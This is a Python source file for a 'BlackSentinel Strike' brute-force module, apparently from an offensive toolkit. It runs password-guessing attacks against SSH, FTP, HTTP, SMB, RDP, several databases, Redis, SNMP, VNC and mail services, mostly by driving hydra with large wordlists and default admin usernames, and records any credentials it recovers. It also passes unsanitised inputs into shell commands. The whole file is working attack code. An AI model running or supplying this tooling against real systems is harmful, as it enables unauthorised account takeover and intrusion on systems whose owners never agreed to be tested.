#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
        BRUTE FORCE MODULE - BlackSentinel Strike
═══════════════════════════════════════════════════════════════
"""

import subprocess
import glob as _glob
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    requests = None


def _find_wordlist():
    """Auto-detect best available wordlist."""
    candidates = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/opt/homebrew/Cellar/dirb/*/wordlists/common.txt",
    ]
    for path in candidates:
        expanded = _glob.glob(path)
        if expanded and Path(expanded[0]).is_file():
            return expanded[0]
    return "/usr/share/wordlists/dirb/common.txt"


_DEFAULT_WORDLIST = _find_wordlist()


class BruteForceModule:
    """Brute force attack module"""

    def __init__(self, callback=None):
        self.callback = callback
        self.results = {}
        self.is_running = False
        self.found_credentials = []
        self.stats = {
            "total_attempts": 0,
            "successful_attempts": 0,
            "failed_attempts": 0,
            "services_tested": [],
            "start_time": None,
            "end_time": None
        }

    def log(self, message, level="info"):
        """Log message"""
        if self.callback:
            self.callback(message, level)

    def _run_hydra(self, target, service, username=None, wordlist=None, threads=4, extra_args=""):
        """Common hydra execution wrapper"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST

        cmd_parts = ["hydra"]
        if username:
            cmd_parts.extend(["-l", username])
        else:
            cmd_parts.extend(["-L", wordlist])
        cmd_parts.extend(["-P", wordlist, "-t", str(threads)])
        if extra_args:
            cmd_parts.extend(extra_args.split())
        cmd_parts.extend([target, service])

        cmd = " ".join(cmd_parts)
        self.log(f"Executing: {cmd}", "info")

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            output = result.stdout + result.stderr
            return output
        except subprocess.TimeoutExpired:
            self.log(f"Hydra timed out for {service} on {target}", "error")
            return ""
        except Exception as e:
            self.log(f"Hydra error: {str(e)}", "error")
            return ""

    def _parse_hydra_output(self, output, service, target):
        """Parse hydra output for found credentials"""
        found = []
        for line in output.split('\n'):
            if f'[{service}]' in line and 'host:' in line:
                parts = line.split()
                if len(parts) >= 2:
                    username = parts[0].split('[')[1].split(']')[0] if '[' in parts[0] else parts[0]
                    password = parts[-1]
                    cred = {
                        "service": service,
                        "username": username,
                        "password": password,
                        "target": target
                    }
                    found.append(cred)
                    self.found_credentials.append(cred)
                    self.log(f"Credential found! {username}:{password}", "success")
        return found

    def ssh_bruteforce(self, target, username, wordlist=None, threads=4):
        """SSH brute force"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        self.log(f"Starting SSH brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("ssh")

        cmd = f"hydra -l {username} -P {wordlist} -t {threads} {target} ssh"

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            output = result.stdout + result.stderr

            # Parse found credentials
            for line in output.split('\n'):
                if '[ssh]' in line and 'host:' in line:
                    parts = line.split()
                    password = parts[-1]
                    self.found_credentials.append({
                        "service": "ssh",
                        "username": username,
                        "password": password,
                        "target": target
                    })
                    self.log(f"Credential found! {username}:{password}", "success")

            self.results["ssh"] = {
                "success": len(self.found_credentials) > 0,
                "output": output,
                "credentials": self.found_credentials
            }

            return output

        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return str(e)
        finally:
            self.is_running = False
            self.stats["end_time"] = datetime.now().isoformat()

    def ssh_bruteforce_advanced(self, target, usernames=None, wordlist=None, threads=4):
        """Advanced SSH brute with multiple users"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["root", "admin", "user", "test", "guest"]

        self.log(f"Starting advanced SSH brute force on {target} with {len(usernames)} users", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("ssh_advanced")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t {threads} {target} ssh"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "ssh", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), threads)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["ssh_advanced"] = {
            "success": len(self.found_credentials) > 0,
            "output": combined_output,
            "credentials": self.found_credentials,
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

    def ftp_bruteforce(self, target, username, wordlist=None, threads=4):
        """FTP brute force"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        self.log(f"Starting FTP brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("ftp")

        cmd = f"hydra -l {username} -P {wordlist} -t {threads} {target} ftp"

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            output = result.stdout + result.stderr

            for line in output.split('\n'):
                if '[ftp]' in line and 'host:' in line:
                    parts = line.split()
                    password = parts[-1]
                    self.found_credentials.append({
                        "service": "ftp",
                        "username": username,
                        "password": password,
                        "target": target
                    })
                    self.log(f"Credential found! {username}:{password}", "success")

            self.results["ftp"] = {
                "success": len(self.found_credentials) > 0,
                "output": output,
                "credentials": self.found_credentials
            }

            return output

        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return str(e)
        finally:
            self.is_running = False
            self.stats["end_time"] = datetime.now().isoformat()

    def ftp_bruteforce_advanced(self, target, usernames=None, wordlist=None, threads=4):
        """Advanced FTP brute with multiple users"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["anonymous", "ftp", "admin", "user", "test"]

        self.log(f"Starting advanced FTP brute force on {target} with {len(usernames)} users", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("ftp_advanced")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t {threads} {target} ftp"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "ftp", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), threads)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["ftp_advanced"] = {
            "success": len(self.found_credentials) > 0,
            "output": combined_output,
            "credentials": self.found_credentials,
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

    def http_bruteforce(self, target, username, wordlist=None, path="/", threads=4):
        """HTTP brute force"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        self.log(f"Starting HTTP brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("http")

        cmd = f"hydra -l {username} -P {wordlist} -t {threads} {target} http-get {path}"

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            output = result.stdout + result.stderr

            for line in output.split('\n'):
                if '[http-get]' in line and 'host:' in line:
                    parts = line.split()
                    password = parts[-1]
                    self.found_credentials.append({
                        "service": "http",
                        "username": username,
                        "password": password,
                        "target": target
                    })
                    self.log(f"Credential found! {username}:{password}", "success")

            self.results["http"] = {
                "success": len(self.found_credentials) > 0,
                "output": output,
                "credentials": self.found_credentials
            }

            return output

        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return str(e)
        finally:
            self.is_running = False
            self.stats["end_time"] = datetime.now().isoformat()

    def http_basic_brute(self, target, path="/", usernames=None, wordlist=None):
        """HTTP Basic Auth brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["admin", "root", "user", "test"]

        if not requests:
            self.log("requests library not installed. Install with: pip install requests", "error")
            return "requests library not installed"

        self.log(f"Starting HTTP Basic Auth brute on {target}{path}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("http_basic")

        url = f"http://{target}{path}"
        found = []

        try:
            with open(wordlist, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            self.log(f"Wordlist not found: {wordlist}", "error")
            self.is_running = False
            return "Wordlist not found"

        total = len(usernames) * len(passwords)
        attempt = 0

        for username in usernames:
            for password in passwords:
                if not self.is_running:
                    break

                attempt += 1
                self.stats["total_attempts"] += 1

                try:
                    response = requests.get(url, auth=(username, password), timeout=10, verify=False)
                    if response.status_code == 200:
                        cred = {
                            "service": "http_basic",
                            "username": username,
                            "password": password,
                            "target": target
                        }
                        found.append(cred)
                        self.found_credentials.append(cred)
                        self.stats["successful_attempts"] += 1
                        self.log(f"Credential found! {username}:{password}", "success")
                        break
                    else:
                        self.stats["failed_attempts"] += 1
                except requests.exceptions.RequestException:
                    self.stats["failed_attempts"] += 1
                    continue

                if attempt % 100 == 0:
                    self.log(f"Progress: {attempt}/{total} attempts", "info")

        self.results["http_basic"] = {
            "success": len(found) > 0,
            "credentials": found,
            "users_tested": usernames,
            "total_attempts": attempt
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return found

    def http_form_brute(self, target, path="/login", user_field="username", pass_field="password", wordlist=None):
        """HTTP form brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST

        if not requests:
            self.log("requests library not installed. Install with: pip install requests", "error")
            return "requests library not installed"

        self.log(f"Starting HTTP form brute on {target}{path}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("http_form")

        url = f"http://{target}{path}"
        found = []

        usernames = ["admin", "root", "user", "test", "guest"]

        try:
            with open(wordlist, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            self.log(f"Wordlist not found: {wordlist}", "error")
            self.is_running = False
            return "Wordlist not found"

        total = len(usernames) * len(passwords)
        attempt = 0

        for username in usernames:
            for password in passwords:
                if not self.is_running:
                    break

                attempt += 1
                self.stats["total_attempts"] += 1

                try:
                    data = {user_field: username, pass_field: password}
                    response = requests.post(url, data=data, timeout=10, verify=False, allow_redirects=False)

                    if response.status_code in [200, 302] and "invalid" not in response.text.lower():
                        cred = {
                            "service": "http_form",
                            "username": username,
                            "password": password,
                            "target": target
                        }
                        found.append(cred)
                        self.found_credentials.append(cred)
                        self.stats["successful_attempts"] += 1
                        self.log(f"Credential found! {username}:{password}", "success")
                        break
                    else:
                        self.stats["failed_attempts"] += 1
                except requests.exceptions.RequestException:
                    self.stats["failed_attempts"] += 1
                    continue

                if attempt % 100 == 0:
                    self.log(f"Progress: {attempt}/{total} attempts", "info")

        self.results["http_form"] = {
            "success": len(found) > 0,
            "credentials": found,
            "users_tested": usernames,
            "total_attempts": attempt
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return found

    def smb_bruteforce(self, target, username, wordlist=None, threads=4):
        """SMB brute force"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        self.log(f"Starting SMB brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("smb")

        cmd = f"hydra -l {username} -P {wordlist} -t {threads} {target} smb"

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            output = result.stdout + result.stderr

            for line in output.split('\n'):
                if '[smb]' in line and 'host:' in line:
                    parts = line.split()
                    password = parts[-1]
                    self.found_credentials.append({
                        "service": "smb",
                        "username": username,
                        "password": password,
                        "target": target
                    })
                    self.log(f"Credential found! {username}:{password}", "success")

            self.results["smb"] = {
                "success": len(self.found_credentials) > 0,
                "output": output,
                "credentials": self.found_credentials
            }

            return output

        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return str(e)
        finally:
            self.is_running = False
            self.stats["end_time"] = datetime.now().isoformat()

    def smb_bruteforce_advanced(self, target, usernames=None, wordlist=None):
        """Advanced SMB brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["administrator", "admin", "guest", "root", "user"]

        self.log(f"Starting advanced SMB brute force on {target} with {len(usernames)} users", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("smb_advanced")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t 4 {target} smb"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "smb", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), 4)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["smb_advanced"] = {
            "success": len(self.found_credentials) > 0,
            "output": combined_output,
            "credentials": self.found_credentials,
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

    def mysql_bruteforce(self, target, username, wordlist=None, threads=4):
        """MySQL brute force"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        self.log(f"Starting MySQL brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("mysql")

        cmd = f"hydra -l {username} -P {wordlist} -t {threads} {target} mysql"

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            output = result.stdout + result.stderr

            for line in output.split('\n'):
                if '[mysql]' in line and 'host:' in line:
                    parts = line.split()
                    password = parts[-1]
                    self.found_credentials.append({
                        "service": "mysql",
                        "username": username,
                        "password": password,
                        "target": target
                    })
                    self.log(f"Credential found! {username}:{password}", "success")

            self.results["mysql"] = {
                "success": len(self.found_credentials) > 0,
                "output": output,
                "credentials": self.found_credentials
            }

            return output

        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return str(e)
        finally:
            self.is_running = False
            self.stats["end_time"] = datetime.now().isoformat()

    def rdp_bruteforce(self, target, username, wordlist=None, threads=4):
        """RDP brute force"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        self.log(f"Starting RDP brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("rdp")

        cmd = f"hydra -l {username} -P {wordlist} -t {threads} {target} rdp"

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            output = result.stdout + result.stderr

            for line in output.split('\n'):
                if '[rdp]' in line and 'host:' in line:
                    parts = line.split()
                    password = parts[-1]
                    self.found_credentials.append({
                        "service": "rdp",
                        "username": username,
                        "password": password,
                        "target": target
                    })
                    self.log(f"Credential found! {username}:{password}", "success")

            self.results["rdp"] = {
                "success": len(self.found_credentials) > 0,
                "output": output,
                "credentials": self.found_credentials
            }

            return output

        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return str(e)
        finally:
            self.is_running = False
            self.stats["end_time"] = datetime.now().isoformat()

    def mssql_bruteforce(self, target, usernames=None, wordlist=None):
        """MSSQL brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["sa", "admin", "sql_svc"]

        self.log(f"Starting MSSQL brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("mssql")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t 4 {target} mssql"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "mssql", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), 4)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["mssql"] = {
            "success": any(c["service"] == "mssql" for c in self.found_credentials),
            "output": combined_output,
            "credentials": [c for c in self.found_credentials if c["service"] == "mssql"],
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

    def oracle_bruteforce(self, target, usernames=None, wordlist=None):
        """Oracle TNS brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["sys", "system", "scott", "hr"]

        self.log(f"Starting Oracle TNS brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("oracle")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t 4 {target} oracle-sid"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "oracle", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), 4)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["oracle"] = {
            "success": any(c["service"] == "oracle" for c in self.found_credentials),
            "output": combined_output,
            "credentials": [c for c in self.found_credentials if c["service"] == "oracle"],
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

    def postgresql_bruteforce(self, target, usernames=None, wordlist=None):
        """PostgreSQL brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["postgres", "admin", "root"]

        self.log(f"Starting PostgreSQL brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("postgresql")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t 4 {target} postgres"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "postgresql", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), 4)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["postgresql"] = {
            "success": any(c["service"] == "postgresql" for c in self.found_credentials),
            "output": combined_output,
            "credentials": [c for c in self.found_credentials if c["service"] == "postgresql"],
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

    def redis_bruteforce(self, target, wordlist=None):
        """Redis AUTH brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST

        self.log(f"Starting Redis AUTH brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("redis")

        try:
            with open(wordlist, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            self.log(f"Wordlist not found: {wordlist}", "error")
            self.is_running = False
            return "Wordlist not found"

        found = []

        for password in passwords:
            if not self.is_running:
                break

            self.stats["total_attempts"] += 1

            cmd = f'echo "AUTH {password}" | nc -w 2 {target} 6379'
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                output = result.stdout + result.stderr

                if "+OK" in output:
                    cred = {
                        "service": "redis",
                        "username": "",
                        "password": password,
                        "target": target
                    }
                    found.append(cred)
                    self.found_credentials.append(cred)
                    self.stats["successful_attempts"] += 1
                    self.log(f"Redis AUTH found! Password: {password}", "success")
                    break
                else:
                    self.stats["failed_attempts"] += 1
            except Exception:
                self.stats["failed_attempts"] += 1
                continue

        self.results["redis"] = {
            "success": len(found) > 0,
            "credentials": found,
            "total_attempts": len(passwords)
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return found

    def mongodb_bruteforce(self, target, usernames=None, wordlist=None):
        """MongoDB brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["admin", "root", "user"]

        self.log(f"Starting MongoDB brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("mongodb")

        try:
            with open(wordlist, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            self.log(f"Wordlist not found: {wordlist}", "error")
            self.is_running = False
            return "Wordlist not found"

        found = []

        for username in usernames:
            if not self.is_running:
                break
            for password in passwords:
                if not self.is_running:
                    break

                self.stats["total_attempts"] += 1

                cmd = f"mongo --host {target} --port 27017 -u {username} -p {password} --authenticationDatabase admin --eval 'db.runCommand({{connectionStatus:1}})' 2>&1"
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    output = result.stdout + result.stderr

                    if "authenticated" in output and '"ok" : 1' in output:
                        cred = {
                            "service": "mongodb",
                            "username": username,
                            "password": password,
                            "target": target
                        }
                        found.append(cred)
                        self.found_credentials.append(cred)
                        self.stats["successful_attempts"] += 1
                        self.log(f"MongoDB credential found! {username}:{password}", "success")
                        break
                    else:
                        self.stats["failed_attempts"] += 1
                except Exception:
                    self.stats["failed_attempts"] += 1
                    continue

        self.results["mongodb"] = {
            "success": len(found) > 0,
            "credentials": found,
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return found

    def snmp_bruteforce(self, target, community_strings=None):
        """SNMP community brute"""
        if community_strings is None:
            community_strings = [
                "public", "private", "community", "manager", "admin",
                "default", "test", "snmp", "secret", "password",
                "monitoring", "read", "write", "access", "internal"
            ]

        self.log(f"Starting SNMP community string brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("snmp")

        found = []

        for community in community_strings:
            if not self.is_running:
                break

            self.stats["total_attempts"] += 1

            cmd = f"snmpwalk -v2c -c {community} {target} system 2>&1"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                output = result.stdout + result.stderr

                if "SNMPv2-MIB" in output and "No response" not in output:
                    cred = {
                        "service": "snmp",
                        "username": "",
                        "password": community,
                        "target": target
                    }
                    found.append(cred)
                    self.found_credentials.append(cred)
                    self.stats["successful_attempts"] += 1
                    self.log(f"SNMP community string found! Community: {community}", "success")
                else:
                    self.stats["failed_attempts"] += 1
            except Exception:
                self.stats["failed_attempts"] += 1
                continue

        self.results["snmp"] = {
            "success": len(found) > 0,
            "credentials": found,
            "communities_tested": community_strings
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return found

    def vnc_bruteforce(self, target, wordlist=None):
        """VNC brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST

        self.log(f"Starting VNC brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("vnc")

        cmd = f"hydra -P {wordlist} -t 4 {target} vnc"
        output = self._run_hydra(target, "vnc", wordlist=wordlist)
        found = self._parse_hydra_output(output, "vnc", target)

        self.results["vnc"] = {
            "success": len(found) > 0,
            "output": output,
            "credentials": found
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return output

    def telnet_bruteforce(self, target, usernames=None, wordlist=None):
        """Telnet brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["admin", "root", "user", "test"]

        self.log(f"Starting Telnet brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("telnet")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t 4 {target} telnet"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "telnet", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), 4)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["telnet"] = {
            "success": any(c["service"] == "telnet" for c in self.found_credentials),
            "output": combined_output,
            "credentials": [c for c in self.found_credentials if c["service"] == "telnet"],
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

    def smtp_bruteforce(self, target, usernames=None, wordlist=None):
        """SMTP brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["admin", "postmaster", "mailer", "smtp"]

        self.log(f"Starting SMTP brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("smtp")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t 4 {target} smtp"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "smtp", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), 4)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["smtp"] = {
            "success": any(c["service"] == "smtp" for c in self.found_credentials),
            "output": combined_output,
            "credentials": [c for c in self.found_credentials if c["service"] == "smtp"],
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

    def pop3_bruteforce(self, target, usernames=None, wordlist=None):
        """POP3 brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["admin", "user", "mail", "pop3"]

        self.log(f"Starting POP3 brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("pop3")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t 4 {target} pop3"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "pop3", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), 4)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["pop3"] = {
            "success": any(c["service"] == "pop3" for c in self.found_credentials),
            "output": combined_output,
            "credentials": [c for c in self.found_credentials if c["service"] == "pop3"],
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

    def imap_bruteforce(self, target, usernames=None, wordlist=None):
        """IMAP brute"""
        if wordlist is None:
            wordlist = _DEFAULT_WORDLIST
        if usernames is None:
            usernames = ["admin", "user", "mail", "imap"]

        self.log(f"Starting IMAP brute force on {target}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append("imap")

        all_output = []

        def try_user(user):
            if not self.is_running:
                return ""
            self.log(f"Testing user: {user}", "info")
            cmd = f"hydra -l {user} -P {wordlist} -t 4 {target} imap"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
                output = result.stdout + result.stderr
                self._parse_hydra_output(output, "imap", target)
                return output
            except Exception as e:
                self.log(f"Error testing {user}: {str(e)}", "error")
                return ""

        with ThreadPoolExecutor(max_workers=min(len(usernames), 4)) as executor:
            futures = {executor.submit(try_user, user): user for user in usernames}
            for future in as_completed(futures):
                if not self.is_running:
                    break
                output = future.result()
                all_output.append(output)

        combined_output = "\n".join(all_output)
        self.results["imap"] = {
            "success": any(c["service"] == "imap" for c in self.found_credentials),
            "output": combined_output,
            "credentials": [c for c in self.found_credentials if c["service"] == "imap"],
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return combined_output

